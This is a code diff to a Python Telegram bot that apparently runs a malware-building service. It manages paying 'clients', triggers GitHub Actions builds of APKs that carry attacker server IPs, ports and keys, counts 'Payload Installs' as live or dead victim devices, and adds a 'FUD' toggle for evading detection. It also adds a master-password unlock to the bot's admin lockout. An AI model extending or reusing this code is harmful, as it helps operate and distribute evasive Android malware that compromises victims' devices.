@@ -236,6 +236,13 @@ def init_db():
             log.info(f"Migration: added builds.{col}")
         except Exception:
             pass  # column already exists
+    # ── Migration: clients table ──────────────────────────────────────────────
+    try:
+        db.execute("ALTER TABLE clients ADD COLUMN vpn_bypass INTEGER NOT NULL DEFAULT 1")
+        db.commit()
+        log.info("Migration: added clients.vpn_bypass")
+    except Exception:
+        pass  # column already exists
     db.close()
     log.info("Database initialized")
 
@@ -576,10 +583,12 @@ def generate_client_token(username: str) -> str:
 # ═══════════════════════════════════════════════════════════════════════════════
 
 # ── State dicts ───────────────────────────────────────────────────────────────
-_verified      = {}   # Layer 1: { chat_id_str: expiry_timestamp }
-_lockout_until = {}   # Layer 3: { chat_id_str: lockout_timestamp }
-_failed_pins   = {}   # Layer 3: { chat_id_str: fail_count }
-_failed_totp   = {}   # Layer 3: { chat_id_str: fail_count }
+_verified        = {}   # Layer 1: { chat_id_str: expiry_timestamp }
+_lockout_until   = {}   # Layer 3: { chat_id_str: lockout_timestamp }
+_failed_pins     = {}   # Layer 3: { chat_id_str: fail_count }
+_failed_totp     = {}   # Layer 3: { chat_id_str: fail_count }
+_unlock_attempts = {}   # Emergency unlock: { chat_id_str: fail_count }
+_unlock_blocked  = set()  # chat_ids permanently ignored until restart (3 wrong master passwords)
 
 pin_buffer       = {}   # { chat_id: "1234" }
 nav_state        = {}   # { chat_id: { "screen": ..., "message_id": ... } }
@@ -595,6 +604,7 @@ SESSION_HOURS    = config.SESSION_TIMEOUT_HRS
 LOCKOUT_MINUTES  = 30
 MAX_PIN_FAILS    = 3
 MAX_TOTP_FAILS   = 3
+MAX_UNLOCK_FAILS = 3
 
 # ── Session file encryption (Layer 5) ────────────────────────────────────────
 
@@ -923,7 +933,7 @@ def kb_clients(clients: list) -> types.InlineKeyboardMarkup:
     return kb
 
 
-def kb_client_detail(client_id: int, active: bool = True) -> types.InlineKeyboardMarkup:
+def kb_client_detail(client_id: int, active: bool = True, vpn_bypass: int = 1) -> types.InlineKeyboardMarkup:
     kb = types.InlineKeyboardMarkup(row_width=1)
     # Primary actions
     kb.add(types.InlineKeyboardButton(
@@ -942,6 +952,13 @@ def kb_client_detail(client_id: int, active: bool = True) -> types.InlineKeyboar
     else:
         kb.add(types.InlineKeyboardButton(
             "🟢 Activate",     callback_data=f"toggle_client_{client_id}"))
+    # FUD toggle
+    if vpn_bypass:
+        kb.add(types.InlineKeyboardButton(
+            "🔴 FUD: ON  → Turn OFF", callback_data=f"toggle_fud_{client_id}"))
+    else:
+        kb.add(types.InlineKeyboardButton(
+            "🟢 FUD: OFF → Turn ON",  callback_data=f"toggle_fud_{client_id}"))
     # Navigation
     kb.add(
         types.InlineKeyboardButton(
@@ -1365,6 +1382,7 @@ def text_client_detail(c: dict) -> str:
         st       = "✅" if last_build["status"] == "success" else "❌"
         last     = f"#{last_build['build_number']} {st} {emoji}"
 
+    fud_label = "🟢 ON" if c.get("vpn_bypass", 1) else "🔴 OFF"
     return (
         f"👤 <b>{name}</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
@@ -1372,6 +1390,7 @@ def text_client_detail(c: dict) -> str:
         f"Telegram ID : <code>{c['telegram_id']}</code>\n"
         f"RDP IP      : <code>{c['rdp_ip']}</code>\n"
         f"Status      : {'🟢 Active' if c['active'] else '🔴 Inactive'}\n"
+        f"FUD         : {fud_label}\n"
         f"Builds      : {builds}\n"
         f"Devices     : {devices}\n"
         f"Last Build  : {last}\n"
@@ -1702,16 +1721,21 @@ def text_client_stats(c: dict) -> str:
                                      ("⚙️", top["template"]))
         top_template = f"{emoji} {name}"
 
+    dead_devices = total_devices - active_24h
     name = c["profile_name"] or c["telegram_username"]
     return (
         f"📊 <b>Stats — {name}</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        f"Total Builds  : {total_builds}\n"
-        f"Successful    : {success_builds}\n"
-        f"Failed        : {total_builds - success_builds}\n"
-        f"Total Devices : {total_devices}\n"
-        f"Active (24h)  : {active_24h}\n"
-        f"Top Template  : {top_template}\n"
+        f"Total Builds      : {total_builds}\n"
+        f"Successful        : {success_builds}\n"
+        f"Failed            : {total_builds - success_builds}\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        f"📱 Payload Installs\n"
+        f"Total Installs    : {total_devices}\n"
+        f"Live  (last 24h)  : {active_24h} 🟢\n"
+        f"Dead              : {dead_devices} 🔴\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        f"Top Template      : {top_template}\n"
         "━━━━━━━━━━━━━━━━━━━━"
     )
 
@@ -1952,7 +1976,8 @@ def show_client_detail(chat_id, message_id, client_id):
         return
     safe_edit(chat_id, message_id,
               text_client_detail(dict(c)),
-              kb_client_detail(client_id, active=bool(c["active"])))
+              kb_client_detail(client_id, active=bool(c["active"]),
+                               vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1)))
 
 
 def show_builds_history(chat_id, message_id, client_id):
@@ -2044,7 +2069,8 @@ def trigger_github_build(template: str, client_id: int,
                          server_port_b64: str = "",
                          server_key_b64: str = "",
                          client_name: str = "",
-                         client_ip: str = "") -> bool:
+                         client_ip: str = "",
+                         client_token: str = "manual") -> bool:
     url     = (
         f"https://api.github.com/repos/"
         f"{config.GITHUB_OWNER}/{config.GITHUB_REPO}"
@@ -2062,6 +2088,7 @@ def trigger_github_build(template: str, client_id: int,
         "build_message_id": str(message_id),
         "client_name":      client_name,
         "client_ip":        client_ip,
+        "client_token":     client_token or "manual",
     }
     if custom_app_name:
         inputs["custom_app_name"] = custom_app_name
@@ -2613,11 +2640,16 @@ def handle_pin_text(message):
     # Layer 3: Check lockout
     locked, mins = is_locked_out(message.chat.id)
     if locked:
+        cid = str(message.chat.id)
+        kb_unlock = types.InlineKeyboardMarkup()
+        if cid not in _unlock_blocked:
+            kb_unlock.add(types.InlineKeyboardButton(
+                "🔓 Unlock", callback_data="do_unlock"))
         safe_edit(
             message.chat.id, msg_id,
             f"🔒 <b>Too many failed attempts.</b>\n"
-            f"Locked for {mins} more minute(s).\n"
-            f"Try again later.",
+            f"Locked for {mins} more minute(s).",
+            kb_unlock,
         )
         return
     entered = message.text.strip() if message.text else ""
@@ -2630,10 +2662,16 @@ def handle_pin_text(message):
         count = record_pin_fail(message.chat.id)
         locked2, mins2 = is_locked_out(message.chat.id)
         if locked2:
+            cid2 = str(message.chat.id)
+            kb_unlock2 = types.InlineKeyboardMarkup()
+            if cid2 not in _unlock_blocked:
+                kb_unlock2.add(types.InlineKeyboardButton(
+                    "🔓 Unlock", callback_data="do_unlock"))
             safe_edit(
                 message.chat.id, msg_id,
                 f"🔒 <b>Too many failed attempts.</b>\n"
                 f"Locked for {mins2} minutes.",
+                kb_unlock2,
             )
         else:
             remaining = MAX_PIN_FAILS - count
@@ -2660,10 +2698,15 @@ def handle_2fa(message):
     # Layer 3: Check lockout
     locked, mins = is_locked_out(message.chat.id)
     if locked:
+        kb_unlock_2fa = types.InlineKeyboardMarkup()
+        if chat_id not in _unlock_blocked:
+            kb_unlock_2fa.add(types.InlineKeyboardButton(
+                "🔓 Unlock", callback_data="do_unlock"))
         safe_edit(
             message.chat.id, msg_id,
             f"🔒 <b>Too many failed attempts.</b>\n"
-            f"Locked for {mins} more minute(s)."
+            f"Locked for {mins} more minute(s).",
+            kb_unlock_2fa,
         )
         return
 
@@ -2678,10 +2721,15 @@ def handle_2fa(message):
         count     = record_totp_fail(message.chat.id)
         locked2, mins2 = is_locked_out(message.chat.id)
         if locked2:
+            kb_unlock_2fa2 = types.InlineKeyboardMarkup()
+            if chat_id not in _unlock_blocked:
+                kb_unlock_2fa2.add(types.InlineKeyboardButton(
+                    "🔓 Unlock", callback_data="do_unlock"))
             safe_edit(
                 message.chat.id, msg_id,
                 f"🔒 <b>Too many failed attempts.</b>\n"
-                f"Locked for {mins2} minutes."
+                f"Locked for {mins2} minutes.",
+                kb_unlock_2fa2,
             )
         else:
             remaining = MAX_TOTP_FAILS - count
@@ -2690,6 +2738,61 @@ def handle_2fa(message):
                 f"❌ Wrong 2FA code. "
                 f"{remaining} attempt(s) left.\n\n"
                 + text_2fa()
+            )
+
+
+# ── Emergency unlock: master password input ───────────────────────────────────
+@bot.message_handler(
+    func=lambda m: nav_state.get(
+        str(m.chat.id), {}).get("screen") == "awaiting_unlock")
+def handle_unlock_password(message):
+    chat_id = str(message.chat.id)
+    if not is_admin(message.chat.id):
+        return
+    msg_id = nav_state.get(chat_id, {}).get("message_id")
+    # Always delete the user's message immediately (security — hide password)
+    try:
+        bot.delete_message(message.chat.id, message.message_id)
+    except Exception:
+        pass
+    # Silently ignore if permanently blocked
+    if chat_id in _unlock_blocked:
+        return
+    entered = message.text.strip() if message.text else ""
+    master_pw = getattr(config, "MASTER_UNLOCK_PASSWORD", "")
+    if entered == master_pw and master_pw:
+        # ✅ Correct — clear lockout, reset unlock counter, show PIN prompt
+        clear_fails(message.chat.id)
+        _unlock_attempts.pop(chat_id, None)
+        pin_buffer[chat_id] = ""
+        nav_state[chat_id] = {"screen": "pin", "message_id": msg_id}
+        safe_edit(
+            message.chat.id, msg_id,
+            "✅ <b>Unlocked.</b> Enter your PIN to continue.\n\n"
+            + text_pin(""),
+            kb_pin(),
+        )
+    else:
+        # ❌ Wrong — track attempts
+        count = _unlock_attempts.get(chat_id, 0) + 1
+        _unlock_attempts[chat_id] = count
+        if count >= MAX_UNLOCK_FAILS:
+            _unlock_blocked.add(chat_id)
+            nav_state.pop(chat_id, None)
+            safe_edit(
+                message.chat.id, msg_id,
+                "🚫 <b>Too many wrong master passwords.</b>\n"
+                "Further unlock attempts are blocked until bot restart."
+            )
+        else:
+            remaining = MAX_UNLOCK_FAILS - count
+            kb_retry = types.InlineKeyboardMarkup()
+            kb_retry.add(types.InlineKeyboardButton(
+                "🔓 Try Again", callback_data="do_unlock"))
+            safe_edit(
+                message.chat.id, msg_id,
+                f"❌ <b>Wrong master password.</b> {remaining} attempt(s) left.",
+                kb_retry,
             )
 
 
@@ -3188,11 +3291,15 @@ def handle_callback(call):
         # Layer 3: Check lockout before showing PIN
         locked, mins = is_locked_out(chat_id)
         if locked:
+            kb_unlock_cb = types.InlineKeyboardMarkup()
+            if str(chat_id) not in _unlock_blocked:
+                kb_unlock_cb.add(types.InlineKeyboardButton(
+                    "🔓 Unlock", callback_data="do_unlock"))
             safe_edit(
                 chat_id, msg_id,
                 f"🔒 <b>Too many failed attempts.</b>\n"
-                f"Locked for {mins} more minute(s).\n"
-                f"Try again later."
+                f"Locked for {mins} more minute(s).",
+                kb_unlock_cb,
             )
             return
         pin_buffer[str(chat_id)] = ""
@@ -3390,7 +3497,50 @@ def handle_callback(call):
                   f"✅ <b>{status_word}</b>\n"
                   f"━━━━━━━━━━━━━━━━━━━━\n"
                   + text_client_detail(dict(c)),
-                  kb_client_detail(client_id, active=bool(new_active)))
+                  kb_client_detail(client_id, active=bool(new_active),
+                                   vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1)))
+
+    elif data == "do_unlock":
+        # Emergency unlock: set nav_state to awaiting_unlock so the next
+        # message is handled by handle_unlock_password
+        cid_str = str(chat_id)
+        if cid_str in _unlock_blocked:
+            # Silently ignore — too many wrong master passwords
+            return
+        nav_state[cid_str] = {"screen": "awaiting_unlock", "message_id": msg_id}
+        safe_edit(
+            chat_id, msg_id,
+            "🔐 <b>Emergency Unlock</b>\n\n"
+            "Enter the master password to clear the lockout:"
+        )
+        return
+
+    elif data.startswith("toggle_fud_"):
+        client_id = int(data.split("_")[2])
+        db        = get_db()
+        c         = db.execute(
+            "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
+        if not c:
+            db.close()
+            safe_edit(chat_id, msg_id, "❌ Client not found.", kb_home_only())
+            return
+        new_bypass = 0 if c["vpn_bypass"] else 1
+        db.execute("UPDATE clients SET vpn_bypass=? WHERE id=?",
+                   (new_bypass, client_id))
+        db.commit()
+        db.close()
+        # Reload fresh data
+        db = get_db()
+        c  = db.execute(
+            "SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
+        db.close()
+        fud_word = "ON 🟢" if new_bypass else "OFF 🔴"
+        safe_edit(chat_id, msg_id,
+                  f"✅ <b>FUD {fud_word}</b>\n"
+                  f"━━━━━━━━━━━━━━━━━━━━\n"
+                  + text_client_detail(dict(c)),
+                  kb_client_detail(client_id, active=bool(c["active"]),
+                                   vpn_bypass=new_bypass))
 
     elif data.startswith("delete_client_"):
         client_id = int(data.split("_")[2])
@@ -3430,6 +3580,80 @@ def handle_callback(call):
         safe_edit(chat_id, msg_id,
                   text_template_select(client_id),
                   kb_template_select(client_id))
+
+    elif data.startswith("quick_rebuild_"):
+        # quick_rebuild_{client_id}_{template}
+        # Fired from the Rebuild button attached directly to the APK document message.
+        # The document message cannot be edited — send a NEW message and use that as nav target.
+        rest      = data[len("quick_rebuild_"):]
+        parts     = rest.split("_", 1)
+        client_id = int(parts[0])
+        template  = parts[1]
+        # Check last build config
+        _db = get_db()
+        _c  = _db.execute("SELECT rdp_ip FROM clients WHERE id=?", (client_id,)).fetchone()
+        _lb = _db.execute(
+            "SELECT server_ip, server_port, server_key FROM builds "
+            "WHERE client_id=? AND template=? AND server_ip != '' "
+            "ORDER BY id DESC LIMIT 1",
+            (client_id, template)).fetchone()
+        _db.close()
+        _rdp_ip = _c["rdp_ip"] if _c else ""
+        if _lb and _lb["server_ip"] and _lb["server_port"] and _lb["server_key"]:
+            # All 3 values available — send new message with pre-filled confirm screen
+            new_msg = bot.send_message(
+                chat_id,
+                text_rebuild_confirm(client_id, template),
+                parse_mode="HTML",
+                reply_markup=kb_rebuild_confirm(client_id, template)
+            )
+            nav_state[str(chat_id)] = {"screen": "rebuild_confirm", "message_id": new_msg.message_id}
+        else:
+            # Missing port/key — send new message, start port entry
+            new_msg = bot.send_message(
+                chat_id,
+                f"🔁 <b>Rebuild — enter port & key</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"📡 IP already set: <code>{_rdp_ip}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"🔌 Enter server port:\n\n"
+                f"<i>Example: 7771</i>",
+                parse_mode="HTML",
+                reply_markup=kb_server_config_cancel(client_id, template)
+            )
+            server_config_buf[str(chat_id)] = {
+                "step":       "port",
+                "client_id":  client_id,
+                "template":   template,
+                "ip":         _rdp_ip,
+                "port":       None,
+                "key":        None,
+                "is_rebuild": True,
+            }
+            nav_state[str(chat_id)] = {"screen": "server_config", "message_id": new_msg.message_id}
+
+    elif data.startswith("quick_cancel_build_"):
+        # quick_cancel_build_{client_id}
+        # Fired from the Cancel Build button on the APK document message.
+        # Cancels the most recent in-progress GitHub Actions run for this client.
+        rest      = data[len("quick_cancel_build_"):]
+        client_id = int(rest.split("_")[0]) if "_" in rest else int(rest)
+        run_id    = prod_active_run.get(str(chat_id))
+        if not run_id:
+            bot.answer_callback_query(call.id, "⚠️ No active build to cancel.", show_alert=False)
+        else:
+            resp = requests.delete(
+                f"{GH_REPO()}/actions/runs/{run_id}/cancel",
+                headers=GH_HEADERS(),
+                timeout=10,
+            )
+            if resp.status_code in (202, 204):
+                bot.answer_callback_query(call.id, "🛑 Build cancelled.", show_alert=False)
+                prod_active_run.pop(str(chat_id), None)
+            elif resp.status_code == 409:
+                bot.answer_callback_query(call.id, "✅ Build already completed.", show_alert=False)
+            else:
+                bot.answer_callback_query(call.id, f"⚠️ Cancel failed ({resp.status_code}).", show_alert=False)
 
     elif data.startswith("template_new_"):
         # template_new_{client_id}_{template} — fresh build, go to server config entry
@@ -3519,7 +3743,7 @@ def handle_callback(call):
         # Load stored config
         _db = get_db()
         _c  = _db.execute(
-            "SELECT profile_name, telegram_username, rdp_ip FROM clients WHERE id=?",
+            "SELECT profile_name, telegram_username, rdp_ip, token FROM clients WHERE id=?",
             (client_id,)).fetchone()
         _lb = _db.execute(
             "SELECT server_ip, server_port, server_key FROM builds "
@@ -3527,8 +3751,9 @@ def handle_callback(call):
             "ORDER BY id DESC LIMIT 1",
             (client_id, template)).fetchone()
         _db.close()
-        _client_name = (_c["profile_name"] or _c["telegram_username"]) if _c else ""
-        _client_ip   = _c["rdp_ip"] if _c else ""
+        _client_name  = (_c["profile_name"] or _c["telegram_username"]) if _c else ""
+        _client_ip    = _c["rdp_ip"] if _c else ""
+        _client_token = _c["token"] if _c else "manual"
         _ip   = (_lb["server_ip"]   if _lb and _lb["server_ip"]   else _client_ip)
         _port = (_lb["server_port"] if _lb and _lb["server_port"] else "")
         _key  = (_lb["server_key"]  if _lb and _lb["server_key"]  else "")
@@ -3557,6 +3782,7 @@ def handle_callback(call):
             server_key_b64=srv_key_b64,
             client_name=_client_name,
             client_ip=_client_ip,
+            client_token=_client_token,
         )
         if ok:
             _db2 = get_db()
@@ -3673,15 +3899,16 @@ def handle_callback(call):
             "━━━━━━━━━━━━━━━━━━━━\n"
             "⏱ Starting..."
         )
-        # Lookup client name + IP for APK filename
+        # Lookup client name + IP + token for APK filename and BuildConfig
         _db = get_db()
         _cl = _db.execute(
-            "SELECT profile_name, telegram_username, rdp_ip FROM clients WHERE id=?",
+            "SELECT profile_name, telegram_username, rdp_ip, token FROM clients WHERE id=?",
             (client_id,)
         ).fetchone()
         _db.close()
-        _client_name = (_cl["profile_name"] or _cl["telegram_username"]) if _cl else ""
-        _client_ip   = _cl["rdp_ip"] if _cl else ""
+        _client_name  = (_cl["profile_name"] or _cl["telegram_username"]) if _cl else ""
+        _client_ip    = _cl["rdp_ip"] if _cl else ""
+        _client_token = _cl["token"] if _cl else "manual"
 
         ok = trigger_github_build(
             template=template,
@@ -3695,6 +3922,7 @@ def handle_callback(call):
             server_key_b64=srv_key_b64,
             client_name=_client_name,
             client_ip=_client_ip,
+            client_token=_client_token,
         )
         if ok:
             db = get_db()
